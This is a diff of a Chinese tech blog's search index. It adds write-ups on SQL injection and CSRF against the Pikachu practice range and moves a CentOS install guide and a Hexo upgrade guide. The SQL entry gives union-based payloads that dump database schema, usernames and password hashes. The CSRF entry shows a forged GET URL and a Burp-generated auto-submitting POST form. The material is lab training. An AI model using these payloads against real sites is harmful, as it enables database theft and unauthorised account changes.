@@ -1,6 +1,42 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CentOS 7 安装教程</title>
+    <url>/posts/c734c1de/</url>
+    <content><![CDATA[<blockquote>
+<p> 已省略部分步骤</p>
+</blockquote>
+<br>
+
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="先择语言"><a href="#先择语言" class="headerlink" title="先择语言"></a>先择语言</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104535.png" alt="1" loading="lazy"></p>
+<h3 id="调整时间，时区"><a href="#调整时间，时区" class="headerlink" title="调整时间，时区"></a>调整时间，时区</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104538.png" alt="2" loading="lazy"></p>
+<h3 id="选择预安装的软件"><a href="#选择预安装的软件" class="headerlink" title="选择预安装的软件"></a>选择预安装的软件</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104540.png" alt="3" loading="lazy"></p>
+<h3 id="配置分区"><a href="#配置分区" class="headerlink" title="配置分区"></a>配置分区</h3><p>如果嫌手动分区麻烦可选择自动分区，但这里我们手动配置。<br>选择我要配置分区，点击完成进入手动配置界面。<br>选择标准分区，点击 + 号添加分区，我们准备分3个区<br>&#x2F;boot（1G）：系统启动引导配置文件存放的区域，不需要太大<br>swap（4G）：交换分区，在系统的物理内存不够用的时候，把硬盘中的一部分空间释放出来，以供当前运行的程序使用，一般为物理内存大小的1.5-2倍<br>&#x2F;（95G）：根分区，将剩余全部大小作为根分区</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104542.png" alt="4" loading="lazy"></p>
+<p>点击完成，接收更改</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104544.png" alt="5" loading="lazy"></p>
+<h3 id="启用网络"><a href="#启用网络" class="headerlink" title="启用网络"></a>启用网络</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104552.png" alt="6" loading="lazy"></p>
+<h3 id="创建普通用户和密码"><a href="#创建普通用户和密码" class="headerlink" title="创建普通用户和密码"></a>创建普通用户和密码</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104555.png" alt="7" loading="lazy"></p>
+<h3 id="Cetos7安装完成"><a href="#Cetos7安装完成" class="headerlink" title="Cetos7安装完成"></a>Cetos7安装完成</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104558.png" alt="8" loading="lazy"></p>
+<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>Centos7初次开机提示Initial setup of CentOS Linux 7</p>
+<p>开机后提示以下信息</p>
+<pre class="language-none"><code class="language-none">Initial setup of CentOS Linux 7 (core) 
+\1) [x] Creat user 2) [!] License information 
+(no user will be created) (license not accepted) 
+Please make your choice from above [‘q’ to quit | ‘c’ to continue | ‘r’ to refresh]:</code></pre>
+
+<p>解决步骤如下：</p>
+<p>1，输入【1】，按Enter键同意许可协议，<br>2，输入【2】，按Enter键阅读许可协议，<br>3，输入【q】，按Enter键退出，<br>4，输入【yes】，按Enter键确定，<br>5，重启之后即可进入图形登录界面</p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>CentOS7</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ARP协议原理与应用</title>
     <url>/posts/9f9ac9a/</url>
     <content><![CDATA[<div class="danger">
@@ -92,42 +128,6 @@
       </categories>
       <tags>
         <tag>锐捷</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CentOS 7 安装教程</title>
-    <url>/posts/c734c1de/</url>
-    <content><![CDATA[<blockquote>
-<p> 已省略部分步骤</p>
-</blockquote>
-<br>
-
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="先择语言"><a href="#先择语言" class="headerlink" title="先择语言"></a>先择语言</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104535.png" alt="1" loading="lazy"></p>
-<h3 id="调整时间，时区"><a href="#调整时间，时区" class="headerlink" title="调整时间，时区"></a>调整时间，时区</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104538.png" alt="2" loading="lazy"></p>
-<h3 id="选择预安装的软件"><a href="#选择预安装的软件" class="headerlink" title="选择预安装的软件"></a>选择预安装的软件</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104540.png" alt="3" loading="lazy"></p>
-<h3 id="配置分区"><a href="#配置分区" class="headerlink" title="配置分区"></a>配置分区</h3><p>如果嫌手动分区麻烦可选择自动分区，但这里我们手动配置。<br>选择我要配置分区，点击完成进入手动配置界面。<br>选择标准分区，点击 + 号添加分区，我们准备分3个区<br>&#x2F;boot（1G）：系统启动引导配置文件存放的区域，不需要太大<br>swap（4G）：交换分区，在系统的物理内存不够用的时候，把硬盘中的一部分空间释放出来，以供当前运行的程序使用，一般为物理内存大小的1.5-2倍<br>&#x2F;（95G）：根分区，将剩余全部大小作为根分区</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104542.png" alt="4" loading="lazy"></p>
-<p>点击完成，接收更改</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104544.png" alt="5" loading="lazy"></p>
-<h3 id="启用网络"><a href="#启用网络" class="headerlink" title="启用网络"></a>启用网络</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104552.png" alt="6" loading="lazy"></p>
-<h3 id="创建普通用户和密码"><a href="#创建普通用户和密码" class="headerlink" title="创建普通用户和密码"></a>创建普通用户和密码</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104555.png" alt="7" loading="lazy"></p>
-<h3 id="Cetos7安装完成"><a href="#Cetos7安装完成" class="headerlink" title="Cetos7安装完成"></a>Cetos7安装完成</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104558.png" alt="8" loading="lazy"></p>
-<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>Centos7初次开机提示Initial setup of CentOS Linux 7</p>
-<p>开机后提示以下信息</p>
-<pre class="language-none"><code class="language-none">Initial setup of CentOS Linux 7 (core) 
-\1) [x] Creat user 2) [!] License information 
-(no user will be created) (license not accepted) 
-Please make your choice from above [‘q’ to quit | ‘c’ to continue | ‘r’ to refresh]:</code></pre>
-
-<p>解决步骤如下：</p>
-<p>1，输入【1】，按Enter键同意许可协议，<br>2，输入【2】，按Enter键阅读许可协议，<br>3，输入【q】，按Enter键退出，<br>4，输入【yes】，按Enter键确定，<br>5，重启之后即可进入图形登录界面</p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>CentOS7</tag>
       </tags>
   </entry>
   <entry>
@@ -516,53 +516,6 @@ select * from users where id&#x3D;1 and greatest(ascii(substr(database(),1,1)),6
       </tags>
   </entry>
   <entry>
-    <title>Hexo版本升级指南</title>
-    <url>/posts/3ba3be9/</url>
-    <content><![CDATA[<p>&#x2F;&#x2F;以下指令均在Hexo目录下操作，先定位到Hexo目录<br>&#x2F;&#x2F;查看当前版本，判断是否需要升级</p>
-<pre class="language-none"><code class="language-none">hexo version</code></pre>
-
-<p>&#x2F;&#x2F;全局升级hexo-cli</p>
-<pre class="language-none"><code class="language-none">npm i hexo-cli -g</code></pre>
-
-<p>&#x2F;&#x2F;再次查看版本，看hexo-cli是否升级成功</p>
-<pre class="language-none"><code class="language-none">hexo version</code></pre>
-
-<p>&#x2F;&#x2F;安装npm-check，若已安装可以跳过</p>
-<pre class="language-none"><code class="language-none">npm install -g npm-check</code></pre>
-
-<p>&#x2F;&#x2F;检查系统插件是否需要升级</p>
-<pre class="language-none"><code class="language-none">npm-check</code></pre>
-
-<p>&#x2F;&#x2F;安装npm-upgrade，若已安装可以跳过</p>
-<pre class="language-none"><code class="language-none">npm install -g npm-upgrade</code></pre>
-
-<p>&#x2F;&#x2F;更新package.json</p>
-<pre class="language-none"><code class="language-none">npm-upgrade</code></pre>
-
-<p>&#x2F;&#x2F;更新全局插件</p>
-<pre class="language-none"><code class="language-none">npm update -g</code></pre>
-
-<p>&#x2F;&#x2F;更新系统插件</p>
-<pre class="language-none"><code class="language-none">npm update --save</code></pre>
-
-<p>&#x2F;&#x2F;再次查看版本，判断是否升级成功</p>
-<pre class="language-none"><code class="language-none">hexo version</code></pre>
-
-
-
-<br>
-
-<p>文章转载自：<a href="https://novnan.github.io/Hexo/update_hexo/">Hexo版本升级指南</a></p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Deepin检查更新失败</title>
     <url>/posts/8b4f8dc5/</url>
     <content><![CDATA[<p>我们更新deepin系统是总会出现检查更新失败,去终端输入命令发现是没有公钥无法验证下列签名</p>
@@ -618,6 +571,53 @@ gpg:               已导入：1</code></pre>
       </categories>
       <tags>
         <tag>deepin</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo版本升级指南</title>
+    <url>/posts/3ba3be9/</url>
+    <content><![CDATA[<p>&#x2F;&#x2F;以下指令均在Hexo目录下操作，先定位到Hexo目录<br>&#x2F;&#x2F;查看当前版本，判断是否需要升级</p>
+<pre class="language-none"><code class="language-none">hexo version</code></pre>
+
+<p>&#x2F;&#x2F;全局升级hexo-cli</p>
+<pre class="language-none"><code class="language-none">npm i hexo-cli -g</code></pre>
+
+<p>&#x2F;&#x2F;再次查看版本，看hexo-cli是否升级成功</p>
+<pre class="language-none"><code class="language-none">hexo version</code></pre>
+
+<p>&#x2F;&#x2F;安装npm-check，若已安装可以跳过</p>
+<pre class="language-none"><code class="language-none">npm install -g npm-check</code></pre>
+
+<p>&#x2F;&#x2F;检查系统插件是否需要升级</p>
+<pre class="language-none"><code class="language-none">npm-check</code></pre>
+
+<p>&#x2F;&#x2F;安装npm-upgrade，若已安装可以跳过</p>
+<pre class="language-none"><code class="language-none">npm install -g npm-upgrade</code></pre>
+
+<p>&#x2F;&#x2F;更新package.json</p>
+<pre class="language-none"><code class="language-none">npm-upgrade</code></pre>
+
+<p>&#x2F;&#x2F;更新全局插件</p>
+<pre class="language-none"><code class="language-none">npm update -g</code></pre>
+
+<p>&#x2F;&#x2F;更新系统插件</p>
+<pre class="language-none"><code class="language-none">npm update --save</code></pre>
+
+<p>&#x2F;&#x2F;再次查看版本，判断是否升级成功</p>
+<pre class="language-none"><code class="language-none">hexo version</code></pre>
+
+
+
+<br>
+
+<p>文章转载自：<a href="https://novnan.github.io/Hexo/update_hexo/">Hexo版本升级指南</a></p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -1168,6 +1168,183 @@ gpg:               已导入：1</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>Pikachu--SQL注入(一)</title>
+    <url>/posts/22ddbd5a/</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
+<p> 在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。</p>
+</blockquote>
+<p>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！<br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
+<h2 id="QLS注入攻击总体思路"><a href="#QLS注入攻击总体思路" class="headerlink" title="QLS注入攻击总体思路"></a>QLS注入攻击总体思路</h2><ol>
+<li>寻找SQL注入位置</li>
+<li>判断服务器类型和后台数据类型</li>
+<li>针对不同的服务器和数据库特点进行SQL注入攻击</li>
+</ol>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>首先打开burp抓包，发现时post方法</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190944.png" alt="1" loading="lazy"></p>
+<h4 id="方法一：利用burp改包"><a href="#方法一：利用burp改包" class="headerlink" title="方法一：利用burp改包"></a>方法一：利用burp改包</h4><pre class="language-none"><code class="language-none">id&#x3D;1 or 1&#x3D;1#		</code></pre>
+
+<p>可以看到，页面将所有id的信息返回了，可知存在数字型注入。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190948.png" alt="2" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1&#39; 					 报错，可判断存在SQL注入</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190951.png" alt="3" loading="lazy"></p>
+<p>确定回显字段</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 order by 3			报错</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191206.png" alt="4" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 order by 2 		存在两个回显，字段数为2</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191211.png" alt="5" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,2		判断回显点，可以在1和2这两处位置，获得我们想要的信息</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191213.png" alt="6" loading="lazy"></p>
+<p>查询数据库名称</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select user(),database() 	 用户名为root@locallhost，数据库为pikachu</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191216.png" alt="7" loading="lazy"></p>
+<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191218.png" alt="8" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191221.png" alt="9" loading="lazy"></p>
+<p>查询user下所有表名</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#    </code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191223.png" alt="10" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_schema&#x3D;database()#      </code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191226.png" alt="11" loading="lazy"></p>
+<p>查询字段username和password的内容</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select group_concat(username),group_concat(password) from users</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191229.png" alt="12" loading="lazy"></p>
+<h4 id="方法二、利用harbar"><a href="#方法二、利用harbar" class="headerlink" title="方法二、利用harbar"></a>方法二、利用harbar</h4><p>（Todo代办）</p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><p>输入： </p>
+<pre class="language-none"><code class="language-none">select id,email from member where username&#x3D;&#39;&#39; or 1&#x3D;1-- q&#39;
+或
+?name&#x3D;%27&amp;submit&#x3D;查询     %27  &#x3D;&#x3D; &#39;  get</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191233.png" alt="13" loading="lazy"></p>
+<p>也可以直接在url中的name参数后进行修改</p>
+<pre class="language-none"><code class="language-none">name&#x3D;%27&amp;submit&#x3D;查询				报错，判断存在SQL注入</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191236.png" alt="14" loading="lazy"></p>
+<p>查询出所有账户数据</p>
+<pre class="language-none"><code class="language-none">&#39; or 1&#x3D;1-- q			</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191238.png" alt="15" loading="lazy"></p>
+<p>确定回显字段</p>
+<pre class="language-none"><code class="language-none">&#39; order by 3 -- q		报错</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191240.png" alt="16" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">&#39; order by 2 -- q				有两个回显</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191243.png" alt="17" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">&#39; union select 1,2 -- q				判断回显点</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191246.png" alt="18" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">&#39; union select user(),database() -- q		可知用户名为root@localhost，数据库名为pikachu</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191249.png" alt="19" loading="lazy"></p>
+<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
+<pre class="language-none"><code class="language-none">&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39; -- q</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191256.png" alt="20" loading="lazy"></p>
+<p>查询user下所有表明 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</p>
+<pre class="language-none"><code class="language-none">&#39; union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; -- q</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191259.png" alt="21" loading="lazy"></p>
+<p>查询字段username和password的内容</p>
+<pre class="language-none"><code class="language-none">&#39; union select group_concat(username),group_concat(password) from users -- q</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191303.png" alt="22" loading="lazy"></p>
+<hr>
+<p>参考链接： </p>
+<p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
+<p>Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：<a href="https://www.freebuf.com/articles/web/254079.html">https://www.freebuf.com/articles/web/254079.html</a></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>pikachu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pikachu--CSRF</title>
+    <url>/posts/546fe1af/</url>
+    <content><![CDATA[<h1 id="Pikachu——CSRF"><a href="#Pikachu——CSRF" class="headerlink" title="Pikachu——CSRF"></a>Pikachu——CSRF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是网站]对用户网页浏览器的信任。</p>
+<p>来自:<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/13777878?fromtitle=CSRF&fromid=2735433&fr=aladdin">百度百科 </a></p>
+<h2 id="CSRF与XSS区别"><a href="#CSRF与XSS区别" class="headerlink" title="CSRF与XSS区别"></a>CSRF与XSS区别</h2><p>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。<br>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</p>
+<h2 id="一、CSRF-get"><a href="#一、CSRF-get" class="headerlink" title="一、CSRF(get)"></a>一、CSRF(get)</h2><p>登陆后点击修改信息</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004817.png" alt="1" loading="lazy"></p>
+<p>然后浏览器上代理，用burpsuite抓包</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004869.png" alt="2" loading="lazy"></p>
+<p>上面是get请求的内容，我们把phonenum的值修改为123456，然后forword，发现账号kobe的信息发生了变化，结果如下图：</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004468.png" alt="3" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004134.png" alt="4" loading="lazy"><em>修改成功</em></p>
+<p>也可以直接构造一个url:</p>
+<p><code> http://192.168.224.135/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=hack&amp;phonenum=hack&amp;add=123456&amp;email=kobe%40pikachu.com&amp;submit=submit</code> </p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004797.png" alt="5" loading="lazy"><em>修改成功</em></p>
+<h2 id="二、CSRF（POST）"><a href="#二、CSRF（POST）" class="headerlink" title="二、CSRF（POST）"></a>二、CSRF（POST）</h2><p>也是先登录，这是必要的，然后抓取提交修改的流量，是POST方式。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004132.png" alt="6" loading="lazy"></p>
+<p>直接在包中修改信息</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005813.png" alt="7" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005429.png" alt="8" loading="lazy"></p>
+<p>也可以自己建一个表单，让被攻击者点恶意站点表单的URL。通过表单的URL去向存在CSRF漏洞的页面去提交POST请求。</p>
+<p>表单代码:</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.224.135/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>61<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>132<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>852741<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>kobe<span class="token entity" title="&#64;">&amp;#64;</span>pikachu<span class="token entity" title="&#46;">&amp;#46;</span>com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005169.png" alt="9" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005882.png" alt="10" loading="lazy"></p>
+<h2 id="三、CSRF（token）"><a href="#三、CSRF（token）" class="headerlink" title="三、CSRF（token）"></a>三、CSRF（token）</h2><p>同样的过程，get方式修改信息，但是还带了一个token参数。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005304.png" alt="11" loading="lazy"></p>
